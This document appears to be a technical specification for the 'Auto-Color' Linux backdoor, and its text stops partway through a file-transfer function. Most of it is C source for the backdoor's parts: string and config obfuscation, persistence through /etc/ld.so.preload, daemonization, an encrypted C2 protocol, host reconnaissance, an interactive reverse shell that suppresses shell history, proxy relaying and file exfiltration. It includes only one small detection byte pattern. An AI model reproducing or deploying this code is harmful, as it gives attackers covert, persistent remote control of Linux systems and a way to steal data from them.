# Auto-Color Backdoor - Technical Specification Document

## Document Information
- **Version:** 1.0
- **Classification:** Technical Reference
- **Target Platform:** Linux (ELF64, Ubuntu)
- **Language:** C/C++
- **Date:** December 2024

---

## Table of Contents

1. [Executive Summary](#1-executive-summary)
2. [System Requirements](#2-system-requirements)
3. [Architecture Overview](#3-architecture-overview)
4. [Module Specifications](#4-module-specifications)
5. [Cryptographic Implementation](#5-cryptographic-implementation)
6. [Installation & Persistence](#6-installation--persistence)
7. [C2 Communication Protocol](#7-c2-communication-protocol)
8. [Command Reference](#8-command-reference)
9. [Evasion Techniques](#9-evasion-techniques)
10. [Shared Library Module](#10-shared-library-module)
11. [Detection Signatures](#11-detection-signatures)

---

## 1. Executive Summary

Auto-Color is a sophisticated Linux backdoor designed for long-term persistent access to compromised systems. The malware employs multiple evasion techniques, encrypted communications, and a modular architecture to avoid detection while maintaining full remote control capabilities.

### Key Features
- Multi-stage string obfuscation (XOR + arithmetic)
- Dynamic API resolution via `dlsym`
- Root/non-root dual execution paths
- Encrypted C2 configuration
- Custom cryptographic protocols
- Shared library injection via `ld.so.preload`
- Process hijacking for persistence
- Network activity hiding
- Full system control capabilities

---

## 2. System Requirements

### 2.1 Target Environment
| Component | Specification |
|-----------|---------------|
| OS | Linux (kernel 3.x+) |
| Architecture | x86_64 (ELF64) |
| Distribution | Ubuntu (primary), compatible with others |
| Libraries | libc, libdl, libpthread |
| Privileges | Root (full features) or User (limited features) |

### 2.2 Required System Calls
```c
// Process Management
fork(), setsid(), getpid(), geteuid(), kill(), execl(), exit()

// File Operations
open(), openat(), read(), write(), close(), unlink(), rename(), mkdir()
access(), stat(), lstat(), fstat(), opendir(), readdir()

// Network
socket(), connect(), bind(), listen(), accept(), select()
send(), recv(), inet_ntoa(), getaddrinfo()

// Memory
mmap(), munmap(), shmat(), shmdt()

// Dynamic Linking
dlopen(), dlsym(), dladdr(), dlclose()

// File Locking
flock()

// I/O Redirection
dup(), dup2()
```

---

## 3. Architecture Overview

### 3.1 Execution Flow Diagram

```
┌─────────────────────────────────────────────────────────────────┐
│                        ENTRY POINT                               │
└─────────────────────────┬───────────────────────────────────────┘
                          │
                          ▼
┌─────────────────────────────────────────────────────────────────┐
│                    PRIVILEGE CHECK                               │
│                     geteuid() == 0?                              │
└─────────────┬───────────────────────────────┬───────────────────┘
              │ YES                           │ NO
              ▼                               ▼
┌─────────────────────────┐     ┌─────────────────────────────────┐
│    ROOT MODE            │     │       GREEN MODE                 │
│  - Full installation    │     │  - Limited functionality        │
│  - Drop libcext.so.2    │     │  - Skip library injection       │
│  - Modify ld.preload    │     │  - Use /tmp for storage         │
└────────────┬────────────┘     └───────────────┬─────────────────┘
             │                                  │
             └──────────────┬───────────────────┘
                            │
                            ▼
┌─────────────────────────────────────────────────────────────────┐
│                    DAEMONIZATION                                 │
│  1. Fork and exit parent                                        │
│  2. setsid() - Create new session                               │
│  3. Second fork - Prevent terminal acquisition                  │
│  4. Redirect stdin/stdout/stderr to /dev/null                   │
│  5. Close all file descriptors                                  │
│  6. umask(0)                                                    │
│  7. chdir("/")                                                  │
└─────────────────────────┬───────────────────────────────────────┘
                          │
                          ▼
┌─────────────────────────────────────────────────────────────────┐
│                  C2 CONNECTION                                   │
│  1. Decrypt configuration                                       │
│  2. Extract C2 address/port                                     │
│  3. Create non-blocking TCP socket                              │
│  4. Perform challenge-response authentication                   │
│  5. Enter command loop                                          │
└─────────────────────────┬───────────────────────────────────────┘
                          │
                          ▼
┌─────────────────────────────────────────────────────────────────┐
│                  COMMAND DISPATCHER                              │
│         Route commands to handler functions                     │
└─────────────────────────────────────────────────────────────────┘
```

### 3.2 Module Architecture

```
┌────────────────────────────────────────────────────────────────────┐
│                         AUTO-COLOR BINARY                          │
├────────────────────────────────────────────────────────────────────┤
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐              │
│  │ String       │  │ Config       │  │ Installation │              │
│  │ Decryption   │  │ Decryption   │  │ Module       │              │
│  └──────────────┘  └──────────────┘  └──────────────┘              │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐              │
│  │ Daemonize    │  │ C2 Protocol  │  │ Command      │              │
│  │ Module       │  │ Handler      │  │ Dispatcher   │              │
│  └──────────────┘  └──────────────┘  └──────────────┘              │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐              │
│  │ File Mgmt    │  │ Reverse Shell│  │ Proxy        │              │
│  │ Commands     │  │ Module       │  │ Module       │              │
│  └──────────────┘  └──────────────┘  └──────────────┘              │
└────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌────────────────────────────────────────────────────────────────────┐
│                      LIBCEXT.SO.2 (SHARED LIBRARY)                 │
├────────────────────────────────────────────────────────────────────┤
│  ┌──────────────────┐  ┌──────────────────┐  ┌──────────────────┐  │
│  │ ld.preload       │  │ Persistence      │  │ Network          │  │
│  │ Protection Hooks │  │ Hooks            │  │ Hiding Hooks     │  │
│  └──────────────────┘  └──────────────────┘  └──────────────────┘  │
└────────────────────────────────────────────────────────────────────┘
```

---

## 4. Module Specifications

### 4.1 String Decryption Module

#### 4.1.1 Algorithm
```c
/**
 * @brief Decrypts obfuscated strings using XOR and arithmetic operations
 * @param enc_data Pointer to encrypted byte array
 * @return Decrypted string (null-terminated)
 * 
 * Algorithm: ((byte + 123) ^ 0x1F) - 123
 */
char* mw_string_decryption(const uint8_t* enc_data) {
    static char result[256];
    int i = 0;
    
    while (enc_data[i] != 0) {
        uint8_t dec_byte = ((enc_data[i] + 123) ^ 0x1F) - 123;
        if (dec_byte == 0) break;
        result[i++] = dec_byte;
    }
    result[i] = '\0';
    return result;
}
```

#### 4.1.2 Instruction Pattern (for detection)
```asm
; Pattern for finding decryption calls
lea     rsi, enc_str_ptr    ; Load encrypted string address
mov     rdi, rax            ; Destination buffer
call    mw_string_decryption

; Byte pattern: 0F B6 00 83 C0 7B 83 F0 1F 83 E8 7B 89 C2 8B 85 ?? ?? ?? ??
```

#### 4.1.3 Encrypted String Examples
| Encrypted Pattern | Decrypted String |
|-------------------|------------------|
| (custom bytes)    | `config-err-`    |
| (custom bytes)    | `%d`             |
| (custom bytes)    | `%x`             |
| (custom bytes)    | `/var/log/cross` |

---

### 4.2 Configuration Decryption Module

#### 4.2.1 Configuration Structure
```c
typedef struct {
    uint32_t size;           // Size of encrypted data (offset 0x20)
    uint8_t  encrypted_data[]; // Encrypted configuration (offset 0x24)
    // Last 4 bytes of encrypted_data contain the key
} encrypted_config_t;
```

#### 4.2.2 Decryption Algorithm
```c
/**
 * @brief Custom decryption for C2 configuration
 * @param key Initial key extracted from last 4 bytes of encrypted data
 * @param enc_data Encrypted configuration bytes
 * @param size Size of encrypted data
 * @return Decrypted data buffer
 * 
 * Key Update Formula: key = (1023 * key - 0x70E52827) & 0xFFFFFFFF
 * Byte Decrypt: ((enc_byte - (key >> 19)) ^ (key >> 11)) - (key >> 3) & 0xFF
 */
uint8_t* decrypt_config(uint32_t key, const uint8_t* enc_data, size_t size) {
    uint8_t* dec_data = malloc(size);
    
    for (size_t i = 0; i < size; i++) {
        key = (1023 * key - 0x70E52827) & 0xFFFFFFFF;
        dec_data[i] = ((enc_data[i] - (key >> 19)) ^ (key >> 11)) - (key >> 3) & 0xFF;
    }
    
    return dec_data;
}
```

#### 4.2.3 Configuration Content Format
```
TCP://hostname_or_ip:PORT
```

#### 4.2.4 Config File Path Generation
```c
/**
 * @brief Generates dynamic config file path
 * @param seed Seed value from decrypted configuration
 * @param seed_len Length of seed
 * @param is_root Running as root flag
 * @return Generated file path string
 */
char* generate_config_path(const uint8_t* seed, size_t seed_len, bool is_root) {
    uint32_t hash = 0xCE7C0B42;
    
    for (size_t i = 0; i < seed_len; i++) {
        hash = (0x3FFFF * hash) + seed[i];
    }
    
    char* path = malloc(128);
    if (is_root) {
        snprintf(path, 128, "/var/log/cross/config-err-%X", hash);
    } else {
        snprintf(path, 128, "/tmp/cross/config-err-%X", hash);
    }
    
    return path;
}
```

---

### 4.3 Daemonization Module

#### 4.3.1 Single Instance Lock
```c
/**
 * @brief Ensures only one instance runs per user
 * @return 0 on success, -1 if another instance exists
 */
int acquire_instance_lock() {
    char lock_path[64];
    uid_t uid = getuid();
    
    snprintf(lock_path, sizeof(lock_path), "/tmp/.lock_%d", uid);
    
    int lock_fd = open(lock_path, O_CREAT | O_RDWR, 0666);
    if (lock_fd < 0) return -1;
    
    // Non-blocking lock attempt
    if (flock(lock_fd, LOCK_EX | LOCK_NB) < 0) {
        close(lock_fd);
        return -1;  // Another instance is running
    }
    
    return lock_fd;
}
```

#### 4.3.2 Full Daemonization Process
```c
/**
 * @brief Converts process to background daemon
 * @return 0 on success, -1 on failure
 */
int daemonize() {
    // First fork - detach from terminal
    pid_t pid = fork();
    if (pid < 0) return -1;
    if (pid > 0) exit(0);  // Parent exits
    
    // Create new session
    if (setsid() < 0) return -1;
    
    // Second fork - prevent terminal acquisition
    pid = fork();
    if (pid < 0) return -1;
    if (pid > 0) exit(0);
    
    // Set working directory to root
    if (chdir("/") < 0) return -1;
    
    // Clear file mode creation mask
    umask(0);
    
    // Close all open file descriptors
    for (int fd = sysconf(_SC_OPEN_MAX); fd >= 0; fd--) {
        close(fd);
    }
    
    // Redirect standard I/O to /dev/null
    int devnull = open("/dev/null", O_RDWR);
    dup2(devnull, STDIN_FILENO);
    dup2(devnull, STDOUT_FILENO);
    dup2(devnull, STDERR_FILENO);
    
    if (devnull > STDERR_FILENO) {
        close(devnull);
    }
    
    return 0;
}
```

---

## 5. Cryptographic Implementation

### 5.1 Encryption Algorithm (Reverse of Decryption)

```c
/**
 * @brief Custom encryption for C2 communication
 * @param key Initial encryption key
 * @param data Plain data to encrypt
 * @param size Size of data
 * @return Number of bytes encrypted (size - 1)
 * 
 * Key Update Formula: key = 1023 * key - 0x70E52827
 * Byte Encrypt: ((key >> 3) + data[i]) ^ (key >> 11) + (key >> 19)
 */
size_t encrypt_data(uint32_t key, uint8_t* data, size_t size) {
    for (size_t i = 0; i < size; i++) {
        key = 1023 * key - 0x70E52827;
        data[i] = ((key >> 3) + data[i]) ^ (key >> 11) + (key >> 19);
    }
    return size - 1;
}
```

### 5.2 Packet Structure

#### 5.2.1 Header Structure
```c
typedef struct __attribute__((packed)) {
    uint32_t encryption_key;   // Dynamic key for payload decryption
    uint32_t session_id;       // Session identifier
    uint32_t status_flag;      // Operation status
    uint32_t payload_size;     // Size of following payload
} packet_header_t;
```

#### 5.2.2 Send Packet Function
```c
/**
 * @brief Encrypts and sends header + payload
 * @param socket_fd Connected socket descriptor
 * @param header Packet header structure
 * @param payload Payload data buffer
 * @param payload_size Size of payload
 * @return 0 on success, error code on failure
 */
int send_encrypted_packet(int socket_fd, packet_header_t* header, 
                          void* payload, size_t payload_size) {
    // Encrypt header
    packet_header_t enc_header = *header;
    encrypt_data(header->encryption_key, (uint8_t*)&enc_header, 
                 sizeof(packet_header_t));
    
    // Send encrypted header
    if (send(socket_fd, &enc_header, sizeof(enc_header), 0) != 
        sizeof(enc_header)) {
        return ERROR_SEND_FAILED;
    }
    
    // Encrypt and send payload (if exists)
    if (payload_size > 0 && payload != NULL) {
        encrypt_data(header->encryption_key, (uint8_t*)payload, payload_size);
        if (send(socket_fd, payload, payload_size, 0) != payload_size) {
            return ERROR_SEND_FAILED;
        }
    }
    
    return 0;
}
```

#### 5.2.3 Receive Packet Function
```c
/**
 * @brief Receives and decrypts header + payload
 * @param socket_fd Connected socket descriptor
 * @param header Output: Decrypted header
 * @param payload Output: Allocated buffer with decrypted payload
 * @return 0 on success, error code on failure
 */
int receive_encrypted_packet(int socket_fd, packet_header_t* header,
                             uint8_t** payload) {
    packet_header_t enc_header;
    
    // Receive encrypted header
    if (recv(socket_fd, &enc_header, sizeof(enc_header), MSG_WAITALL) != 
        sizeof(enc_header)) {
        return ERROR_RECV_FAILED;
    }
    
    // Decrypt header
    *header = enc_header;
    decrypt_config(header->encryption_key, (uint8_t*)header, 
                   sizeof(packet_header_t));
    
    // Allocate and receive payload
    if (header->payload_size > 0) {
        *payload = malloc(header->payload_size);
        if (recv(socket_fd, *payload, header->payload_size, MSG_WAITALL) != 
            header->payload_size) {
            free(*payload);
            return ERROR_RECV_FAILED;
        }
        
        // Decrypt payload with key from header
        decrypt_config(header->encryption_key, *payload, header->payload_size);
    }
    
    return 0;
}
```

### 5.3 Authentication Handshake

```c
/**
 * @brief Performs challenge-response authentication with C2
 * @param socket_fd Connected socket descriptor
 * @return 0 on success, -1 on authentication failure
 */
int perform_authentication(int socket_fd) {
    // Generate pseudo-random challenge
    uint32_t random_value = generate_pseudo_random();
    
    // Derive three challenge values using XOR with constants
    uint32_t challenge[3];
    challenge[0] = random_value ^ CHALLENGE_CONST_1;
    challenge[1] = random_value ^ CHALLENGE_CONST_2;
    challenge[2] = random_value ^ CHALLENGE_CONST_3;
    
    // Send challenges
    if (send(socket_fd, challenge, sizeof(challenge), 0) != sizeof(challenge)) {
        return -1;
    }
    
    // Receive expected response
    uint32_t response[3];
    if (recv(socket_fd, response, sizeof(response), MSG_WAITALL) != sizeof(response)) {
        return -1;
    }
    
    // Validate response (server must return correct transformations)
    uint32_t expected[3];
    compute_expected_response(random_value, expected);
    
    if (memcmp(response, expected, sizeof(expected)) != 0) {
        return -1;  // Authentication failed
    }
    
    return 0;
}
```

---

## 6. Installation & Persistence

### 6.1 Root Mode Installation

```c
/**
 * @brief Full installation with root privileges
 * @return 0 on success, error code on failure
 */
int install_root_mode() {
    const char* install_path = "/var/log/cross/auto-color";
    const char* lib_path = NULL;
    
    // Check if already installed
    if (access(install_path, F_OK) == 0) {
        return 0;  // Already installed
    }
    
    // Create installation directory with full permissions
    mkdir("/var/log/cross", 0777);
    chmod("/var/log/cross", 0777);
    
    // Copy self to installation path
    if (copy_file("/proc/self/exe", install_path) != 0) {
        return ERROR_INSTALL_FAILED;
    }
    chmod(install_path, 0755);
    
    // Determine library path using dladdr
    Dl_info info;
    if (dladdr(strerror, &info) && info.dli_fname) {
        char* dir = strdup(info.dli_fname);
        char* last_slash = strrchr(dir, '/');
        if (last_slash) *last_slash = '\0';
        
        char lib_full_path[256];
        snprintf(lib_full_path, sizeof(lib_full_path), "%s/libcext.so.2", dir);
        lib_path = strdup(lib_full_path);
        free(dir);
    } else {
        lib_path = strdup("/lib/libcext.so.2");
    }
    
    // Drop malicious shared library
    extract_embedded_library(lib_path);
    chmod(lib_path, 0755);
    
    // Modify /etc/ld.so.preload
    FILE* preload = fopen("/etc/ld.so.preload", "a");
    if (preload) {
        fprintf(preload, "%s\n", lib_path);
        fclose(preload);
    }
    
    // Clean up old installations
    unlink("/var/log/cross/door");
    unlink("/var/log/cross/egg");
    unlink("/var/log/cross/log");
    unlink(lib_path);  // Remove old library if exists
    extract_embedded_library(lib_path);  // Re-extract fresh copy
    
    free(lib_path);
    
    printf("install ok");
    return 0;
}
```

### 6.2 Shared Memory for IP Tracking

```c
/**
 * @brief Accesses shared memory segment for C2 IP tracking
 * @return Pointer to shared memory, NULL on failure
 */
shared_mem_t* access_shared_memory() {
    key_t shm_key = ftok("/var/log/cross", 'A');
    int shm_id = shmget(shm_key, sizeof(shared_mem_t), 0666 | IPC_CREAT);
    
    if (shm_id < 0) {
        return NULL;
    }
    
    shared_mem_t* shm_ptr = (shared_mem_t*)shmat(shm_id, NULL, 0);
    if (shm_ptr == (void*)-1) {
        return NULL;
    }
    
    return shm_ptr;
}

typedef struct {
    uint32_t c2_ip_count;
    uint32_t c2_ips[MAX_C2_IPS];  // IPs to hide from /proc/net/tcp
    uint32_t c2_ports[MAX_C2_PORTS];
    // ... additional tracking data
} shared_mem_t;
```

---

## 7. C2 Communication Protocol

### 7.1 Connection Establishment

```c
/**
 * @brief Establishes TCP connection to C2 server
 * @param config Decrypted configuration containing C2 address
 * @return Connected socket descriptor, -1 on failure
 */
int connect_to_c2(const char* config) {
    char protocol[16], hostname[256], port_str[16];
    
    // Parse config: TCP://hostname:port
    sscanf(config, "%[^:]://%[^:]:%s", protocol, hostname, port_str);
    
    struct addrinfo hints = {0};
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    
    struct addrinfo* result;
    if (getaddrinfo(hostname, port_str, &hints, &result) != 0) {
        return -1;
    }
    
    // Create non-blocking socket
    int sock = socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK, 0);
    if (sock < 0) {
        freeaddrinfo(result);
        return -1;
    }
    
    // Connect (may return EINPROGRESS for non-blocking)
    connect(sock, result->ai_addr, result->ai_addrlen);
    freeaddrinfo(result);
    
    // Store resolved IP in shared memory
    struct sockaddr_in* addr = (struct sockaddr_in*)result->ai_addr;
    store_c2_ip(addr->sin_addr.s_addr);
    
    return sock;
}
```

### 7.2 Command Loop

```c
/**
 * @brief Main C2 command processing loop
 * @param socket_fd Connected socket descriptor
 */
void command_loop(int socket_fd) {
    while (1) {
        packet_header_t header;
        uint8_t* payload = NULL;
        
        int result = receive_encrypted_packet(socket_fd, &header, &payload);
        if (result != 0) {
            break;  // Connection lost or error
        }
        
        // Dispatch command based on ID
        int cmd_result = dispatch_command(header.session_id, 
                                          header.status_flag,  // Command ID
                                          payload, 
                                          header.payload_size);
        
        if (payload) free(payload);
        
        // Send response
        packet_header_t resp_header = {0};
        resp_header.encryption_key = generate_new_key();
        resp_header.session_id = header.session_id;
        resp_header.status_flag = cmd_result;
        resp_header.payload_size = 0;
        
        send_encrypted_packet(socket_fd, &resp_header, NULL, 0);
    }
}
```

---

## 8. Command Reference

### 8.1 Command Summary Table

| Command ID | Name | Description | Root Required |
|------------|------|-------------|---------------|
| 0x1 | SYSTEM_INFO | Gather system information | No |
| 0xF | SELF_DESTRUCT | Remove all traces and terminate | Yes |
| 0x100 | REVERSE_SHELL | Create interactive shell | No |
| 0x201 | DIR_LIST | List directory contents | No |
| 0x202 | FILE_TRANSFER | Upload/download files | No |
| 0x204 | FILE_CREATE | Create file or directory | No |
| 0x205 | FILE_RENAME | Rename file or directory | No |
| 0x206 | FILE_DELETE | Delete file or directory | No |
| 0x300 | PROXY | Use host as network proxy | No |
| 0x400 | CONFIG_READ | Read and send configuration | No |
| 0x401 | CONFIG_WRITE | Modify configuration | No |

### 8.2 Command 0x1 - System Information Gathering

```c
/**
 * @brief Collects comprehensive system information
 * @param socket_fd Socket for sending response
 * @return Status code
 */
int cmd_system_info(int socket_fd) {
    char* buffer = malloc(MAX_INFO_SIZE);
    size_t offset = 0;
    
    // System Date
    time_t now = time(NULL);
    struct tm* tm_info = localtime(&now);
    offset += sprintf(buffer + offset, "DATE:%04d-%02d-%02d|", 
                      tm_info->tm_year + 1900, 
                      tm_info->tm_mon + 1, 
                      tm_info->tm_mday);
    
    // OS Version
    FILE* fp = fopen("/proc/version", "r");
    if (fp) {
        char line[256];
        if (fgets(line, sizeof(line), fp)) {
            offset += sprintf(buffer + offset, "OS:%s|", line);
        }
        fclose(fp);
    }
    
    // Hostname
    char hostname[256];
    gethostname(hostname, sizeof(hostname));
    offset += sprintf(buffer + offset, "HOST:%s|", hostname);
    
    // Username
    char* username = getenv("USER");
    if (!username) username = getenv("LOGNAME");
    if (!username) username = "unknown";
    offset += sprintf(buffer + offset, "USER:%s|", username);
    
    // IP Addresses
    struct ifaddrs* ifaddr;
    if (getifaddrs(&ifaddr) == 0) {
        offset += sprintf(buffer + offset, "IPS:");
        for (struct ifaddrs* ifa = ifaddr; ifa; ifa = ifa->ifa_next) {
            if (ifa->ifa_addr && ifa->ifa_addr->sa_family == AF_INET) {
                struct sockaddr_in* addr = (struct sockaddr_in*)ifa->ifa_addr;
                offset += sprintf(buffer + offset, "%s,", 
                                  inet_ntoa(addr->sin_addr));
            }
        }
        buffer[offset-1] = '|';  // Replace last comma
        freeifaddrs(ifaddr);
    }
    
    // Processor Info
    fp = fopen("/proc/cpuinfo", "r");
    if (fp) {
        char line[256];
        while (fgets(line, sizeof(line), fp)) {
            if (strncmp(line, "model name", 10) == 0) {
                char* colon = strchr(line, ':');
                if (colon) {
                    offset += sprintf(buffer + offset, "CPU:%s|", colon + 2);
                }
                break;
            }
        }
        fclose(fp);
    }
    
    // Total Memory
    fp = fopen("/proc/meminfo", "r");
    if (fp) {
        char line[256];
        while (fgets(line, sizeof(line), fp)) {
            if (strncmp(line, "MemTotal", 8) == 0) {
                offset += sprintf(buffer + offset, "MEM:%s", line + 10);
                break;
            }
        }
        fclose(fp);
    }
    
    // Total Disk Space
    struct statvfs vfs;
    if (statvfs("/", &vfs) == 0) {
        unsigned long long total = (unsigned long long)vfs.f_blocks * 
                                   vfs.f_frsize;
        offset += sprintf(buffer + offset, "DISK:%llu|", total);
    }
    
    // Process ID
    offset += sprintf(buffer + offset, "PID:%d|", getpid());
    
    // Executable Path
    char exe_path[256];
    ssize_t len = readlink("/proc/self/exe", exe_path, sizeof(exe_path)-1);
    if (len > 0) {
        exe_path[len] = '\0';
        offset += sprintf(buffer + offset, "EXE:%s|", exe_path);
    }
    
    // Append current configuration
    char* config = get_current_config();
    if (config) {
        offset += sprintf(buffer + offset, "CONFIG:%s|", config);
        free(config);
    }
    
    // Send collected information
    packet_header_t header = {0};
    header.encryption_key = generate_new_key();
    header.payload_size = offset;
    
    send_encrypted_packet(socket_fd, &header, buffer, offset);
    free(buffer);
    
    return 0;
}
```

### 8.3 Command 0xF - Self Destruct

```c
/**
 * @brief Removes all malware traces and terminates
 * @return Status code (never returns - process terminates)
 */
int cmd_self_destruct() {
    // Clean up system files
    cleanup_system_files();
    
    // Get own PID and send SIGKILL
    pid_t pid = getpid();
    kill(pid, SIGKILL);
    
    // This should never be reached
    return 104;
}

/**
 * @brief Removes all installed malware components
 */
void cleanup_system_files() {
    // Remove installation directory
    remove_directory("/var/log/cross");
    
    // Remove temporary directory (non-root installations)
    remove_directory("/tmp/cross");
    
    // Clean /etc/ld.so.preload
    FILE* preload = fopen("/etc/ld.so.preload", "r");
    if (preload) {
        char* lines[64];
        int count = 0;
        char line[256];
        
        while (fgets(line, sizeof(line), preload) && count < 64) {
            if (strstr(line, "libcext.so.2") == NULL) {
                lines[count++] = strdup(line);
            }
        }
        fclose(preload);
        
        // Rewrite without malicious entry
        preload = fopen("/etc/ld.so.preload", "w");
        if (preload) {
            for (int i = 0; i < count; i++) {
                fputs(lines[i], preload);
                free(lines[i]);
            }
            fclose(preload);
        }
    }
    
    // Remove shared library
    char lib_path[256];
    Dl_info info;
    if (dladdr(strerror, &info) && info.dli_fname) {
        snprintf(lib_path, sizeof(lib_path), "%s/libcext.so.2", 
                 dirname(strdup(info.dli_fname)));
    } else {
        strcpy(lib_path, "/lib/libcext.so.2");
    }
    unlink(lib_path);
}
```

### 8.4 Command 0x100 - Reverse Shell

```c
/**
 * @brief Creates interactive reverse shell
 * @param socket_fd Socket connected to attacker
 * @return Status code
 */
int cmd_reverse_shell(int socket_fd) {
    int pipe_in[2], pipe_out[2];
    
    // Create pipes for I/O
    if (pipe(pipe_in) < 0 || pipe(pipe_out) < 0) {
        return ERROR_PIPE_FAILED;
    }
    
    pid_t pid = fork();
    if (pid < 0) {
        return ERROR_FORK_FAILED;
    }
    
    if (pid == 0) {
        // Child process - shell
        
        // Redirect stdin from pipe
        dup2(pipe_in[0], STDIN_FILENO);
        
        // Redirect stdout/stderr to pipe
        dup2(pipe_out[1], STDOUT_FILENO);
        dup2(pipe_out[1], STDERR_FILENO);
        
        // Close unused pipe ends
        close(pipe_in[0]);
        close(pipe_in[1]);
        close(pipe_out[0]);
        close(pipe_out[1]);
        
        // Clear command history
        setenv("HISTFILE", "/dev/null", 1);
        setenv("HISTSIZE", "0", 1);
        
        // Execute interactive bash shell
        char* argv[] = {"/bin/bash", "-i", NULL};
        execv("/bin/bash", argv);
        
        exit(1);  // Only reached if execv fails
    }
    
    // Parent process - relay data
    close(pipe_in[0]);
    close(pipe_out[1]);
    
    // Use select() to multiplex between socket and pipes
    fd_set read_fds;
    char buffer[4096];
    
    while (1) {
        FD_ZERO(&read_fds);
        FD_SET(socket_fd, &read_fds);
        FD_SET(pipe_out[0], &read_fds);
        
        int max_fd = (socket_fd > pipe_out[0]) ? socket_fd : pipe_out[0];
        
        if (select(max_fd + 1, &read_fds, NULL, NULL, NULL) < 0) {
            break;
        }
        
        // Data from attacker -> shell
        if (FD_ISSET(socket_fd, &read_fds)) {
            ssize_t n = recv(socket_fd, buffer, sizeof(buffer), 0);
            if (n <= 0) break;
            write(pipe_in[1], buffer, n);
        }
        
        // Data from shell -> attacker
        if (FD_ISSET(pipe_out[0], &read_fds)) {
            ssize_t n = read(pipe_out[0], buffer, sizeof(buffer));
            if (n <= 0) break;
            send(socket_fd, buffer, n, 0);
        }
    }
    
    // Cleanup
    close(pipe_in[1]);
    close(pipe_out[0]);
    kill(pid, SIGKILL);
    
    return 0;
}
```

### 8.5 Command 0x300 - Proxy Mode

```c
/**
 * @brief Uses infected host as network proxy
 * @param target_ip IP address to connect to
 * @param target_port Port to connect to
 * @param listen_socket Socket receiving connections from C2
 * @return Status code
 */
int cmd_proxy(uint32_t target_ip, uint16_t target_port, int listen_socket) {
    // Connect to remote target
    int remote_socket = socket(AF_INET, SOCK_STREAM, 0);
    
    struct sockaddr_in target_addr = {0};
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(target_port);
    target_addr.sin_addr.s_addr = target_ip;
    
    if (connect(remote_socket, (struct sockaddr*)&target_addr, 
                sizeof(target_addr)) < 0) {
        close(remote_socket);
        return ERROR_CONNECT_FAILED;
    }
    
    // Accept connection from C2/attacker
    int attacker_socket = accept(listen_socket, NULL, NULL);
    if (attacker_socket < 0) {
        close(remote_socket);
        return ERROR_ACCEPT_FAILED;
    }
    
    // Relay data between sockets using select()
    fd_set read_fds;
    struct timeval timeout = {0, 100000};  // 100ms timeout
    char buffer[8192];
    
    while (1) {
        FD_ZERO(&read_fds);
        FD_SET(attacker_socket, &read_fds);
        FD_SET(remote_socket, &read_fds);
        
        int max_fd = (attacker_socket > remote_socket) ? 
                     attacker_socket : remote_socket;
        
        int ready = select(max_fd + 1, &read_fds, NULL, NULL, &timeout);
        if (ready < 0) break;
        if (ready == 0) continue;  // Timeout, continue loop
        
        // Attacker -> Target
        if (FD_ISSET(attacker_socket, &read_fds)) {
            ssize_t n = recv(attacker_socket, buffer, sizeof(buffer), 0);
            if (n <= 0) break;
            send(remote_socket, buffer, n, 0);
        }
        
        // Target -> Attacker
        if (FD_ISSET(remote_socket, &read_fds)) {
            ssize_t n = recv(remote_socket, buffer, sizeof(buffer), 0);
            if (n <= 0) break;
            send(attacker_socket, buffer, n, 0);
        }
    }
    
    close(attacker_socket);
    close(remote_socket);
    
    return 0;
}
```

### 8.6 Command 0x201 - Directory Listing

```c
/**
 * @brief Scans directory and returns file metadata
 * @param dir_path Path to directory to scan
 * @param socket_fd Socket for sending response
 * @return Status code
 */
int cmd_dir_list(const char* dir_path, int socket_fd) {
    DIR* dir = opendir(dir_path);
    if (!dir) {
        return ERROR_OPENDIR_FAILED;
    }
    
    uint8_t* buffer = malloc(MAX_DIR_LIST_SIZE);
    size_t offset = 0;
    
    struct dirent* entry;
    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || 
            strcmp(entry->d_name, "..") == 0) {
            continue;
        }
        
        char full_path[512];
        snprintf(full_path, sizeof(full_path), "%s/%s", dir_path, 
                 entry->d_name);
        
        struct stat st;
        if (stat(full_path, &st) < 0) continue;
        
        // Build entry structure
        dir_entry_t dir_entry = {0};
        strncpy(dir_entry.name, entry->d_name, 255);
        dir_entry.is_dir = S_ISDIR(st.st_mode);
        dir_entry.permissions = st.st_mode & 0777;
        dir_entry.size = st.st_size;
        dir_entry.atime = st.st_atime;
        dir_entry.mtime = st.st_mtime;
        dir_entry.ctime = st.st_ctime;
        
        // Check for subdirectories
        if (dir_entry.is_dir) {
            DIR* sub_dir = opendir(full_path);
            if (sub_dir) {
                struct dirent* sub_entry;
                int sub_count = 0;
                while ((sub_entry = readdir(sub_dir)) != NULL) {
                    if (strcmp(sub_entry->d_name, ".") != 0 && 
                        strcmp(sub_entry->d_name, "..") != 0) {
                        sub_count++;
                    }
                }
                dir_entry.has_subdirs = (sub_count > 0);
                closedir(sub_dir);
            }
        }
        
        memcpy(buffer + offset, &dir_entry, sizeof(dir_entry));
        offset += sizeof(dir_entry);
    }
    
    closedir(dir);
    
    // Send directory listing
    packet_header_t header = {0};
    header.encryption_key = generate_new_key();
    header.payload_size = offset;
    
    send_encrypted_packet(socket_fd, &header, buffer, offset);
    free(buffer);
    
    return 0;
}

typedef struct __attribute__((packed)) {
    char name[256];
    uint8_t is_dir;
    uint8_t has_subdirs;
    uint16_t permissions;
    uint32_t size;
    uint64_t atime;
    uint64_t mtime;
    uint64_t ctime;
} dir_entry_t;
```

### 8.7 Command 0x202 - File Transfer

```c
/**
 * @brief Handles file upload/download operations
 * @param direction "R2L" for download, "L2R" for upload
 * @param file_path Path to file
 * @param data File data (for upload)
 * @param data_size Size of data (for upload)
 * @param socket_fd Socket for communication
 * @return Status code
 */
int cmd_file_transfer(const char* direction, const char* file_path,
                      const uint8_t* data, size_t data_size, 
                      int socket_fd) {
    if (strcmp(direction, "R2L") == 0) {
        // Download: Send file to C2
        FILE* fp = fopen(file_path, "rb");
        if (!fp) return ERROR_FILE_OPEN_FAILED;
        
        // Get file size
        fseek(fp, 0, SEEK_END);
        long file_size = ftell(fp);
        fseek(fp, 0, SEEK_SET);
        
        // Send file in chunks
        uint8_t chunk[4096];
        size_t remaining = file_size;
        
        while (remaining > 0) {
            size_t to_read = (remaining > sizeof(chunk)) ? 
                            sizeof(chunk) : remaining;
            size_t read = fread(chunk, 1, to_read, fp);
